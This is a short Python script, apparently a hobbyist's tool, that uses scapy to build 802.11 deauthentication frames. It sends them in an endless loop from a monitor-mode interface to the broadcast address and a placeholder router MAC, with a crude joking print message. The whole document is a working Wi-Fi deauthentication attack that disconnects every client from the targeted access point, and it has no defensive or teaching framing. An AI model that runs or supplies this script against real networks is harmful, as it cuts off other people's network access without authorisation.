from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

iface = "wlan0mon"
target_mac = "ff:ff:ff:ff:ff:ff"  #
bssid_mac = "YY:YY:YY:YY:YY:YY"  # router macnchz

pkt1 = (
    RadioTap()
    / Dot11(addr1=target_mac, addr2=bssid_mac, addr3=bssid_mac)
    / Dot11Deauth(reason=7)
)
pkt2 = (
    RadioTap()
    / Dot11(addr1=bssid_mac, addr2=target_mac, addr3=bssid_mac)
    / Dot11Deauth(reason=7)
)

print("Firing muh fuckin LAZER")
sendp([pkt1, pkt2], iface=iface, inter=0.1, loop=1)
